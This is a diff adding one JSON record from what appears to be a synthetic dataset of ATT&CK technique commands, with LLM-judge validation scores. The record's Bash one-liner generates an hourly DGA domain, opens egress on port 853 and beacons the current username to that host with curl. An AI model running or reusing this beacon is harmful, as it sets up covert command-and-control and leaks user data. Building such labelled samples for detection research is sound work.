@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"theta\"; LABEL=$(echo -n \"${SEED}$(date -u +%Y%m%d%H)\" | md5sum | cut -c1-14); FQDN=\"${LABEL}.update-pipeline.co\"; PORT=853; iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; IP=$(getent hosts \"$FQDN\" | awk '{print $1}' | head -n1); curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" \"https://${FQDN}:${PORT}/api/v1/beacon?u=$(whoami)\"",
+  "explanation": "Targets a DGA domain and connects over TLS on port 853 to mimic DoT-like traffic patterns while binding the session to the dynamically resolved IP.",
+  "rationale_steps": [
+    "Create hourly DGA hostname",
+    "Resolve via NSS to obtain an IP",
+    "Allow egress on port 853",
+    "Beacon using curl bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-05bd7719",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Bash pipeline uses balanced quoting, proper separators, and valid options for md5sum, cut, iptables, getent, awk, and curl.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates an hourly DGA-like domain, resolves and pins the IP via curl --resolve, and beacons over TLS on port 853 consistent with T1568, although iptables requires root and using HTTPS on 853 to mimic DoT is somewhat contrived.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:02:38.404465Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolon separators, valid flag usage for md5sum, cut, iptables, getent, awk, and curl, and correct variable interpolation throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command authentically implements T1568 DGA behavior by seeding a time-based MD5 domain label, resolving it dynamically, adding an iptables rule to permit port 853 (mimicking DNS-over-TLS traffic), binding the curl request to the resolved IP via --resolve, and beaconing with user context — all operationally coherent and realistic.",
+        "combined_score": 5.0,
+        "confidence": 0.93,
+        "timestamp": "2026-02-19T00:16:56.196210Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct Bash syntax, properly balanced quotes, valid command substitutions, and standard piping and redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a time-based DGA and uses curl's resolve flag to pin the connection to the resolved IP, but the iptables command will fail without the root privileges that the metadata specifies are unavailable.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:17:01.007240Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
